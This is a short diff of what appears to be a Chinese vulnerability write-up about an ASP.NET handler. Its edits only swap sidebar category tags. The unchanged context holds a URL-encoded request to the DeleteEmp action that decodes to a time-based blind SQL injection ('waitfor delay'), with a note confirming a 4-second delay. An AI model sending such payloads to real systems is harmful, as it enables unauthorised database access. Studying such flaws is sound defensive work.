@@ -36,15 +36,15 @@ public void ProcessRequest(HttpContext context)
 
 深入探索
 
-计算机安全
+防病毒程序与恶意软件
 
-网络
+博客资源与服务
 
-开发工具
+数学
 
 当 **action=DeleteEmp** 时，处理逻辑如下
 
-脚本语言
+黑客与破解
 
 ```
 string str7 = context.Request["fuids"];
@@ -79,4 +79,4 @@ action=DeleteEmp&key=%31%20%77%61%69%74%66%6f%72%20%44%45%6c%61%59%27%30%3a%30%3
 
 成功延时 4 秒
 
-黑客与破解
+软件
